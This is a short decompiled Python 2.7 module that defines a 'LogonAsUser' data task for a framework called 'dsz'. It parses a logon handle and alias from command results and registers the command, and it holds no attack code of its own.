# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import dsz.cmd
import dsz.data
import dsz.lp

class LogonAsUser(dsz.data.Task):

    def __init__(self, cmd=None):
        dsz.data.Task.__init__(self, cmd)

    def _LoadData(self):
        try:
            self.logon = LogonAsUser.logon(dsz.cmd.data.Get('logon', dsz.TYPE_OBJECT)[0])
        except:
            self.logon = None

        return

    class logon(dsz.data.DataBean):

        def __init__(self, obj):
            try:
                self.handle = dsz.cmd.data.ObjectGet(obj, 'handle', dsz.TYPE_INT)[0]
            except:
                self.handle = None

            try:
                self.alias = dsz.cmd.data.ObjectGet(obj, 'alias', dsz.TYPE_STRING)[0]
            except:
                self.alias = None

            return


dsz.data.RegisterCommand('LogonAsUser', LogonAsUser)
LOGONASUSER = LogonAsUser
logonasuser = LogonAsUser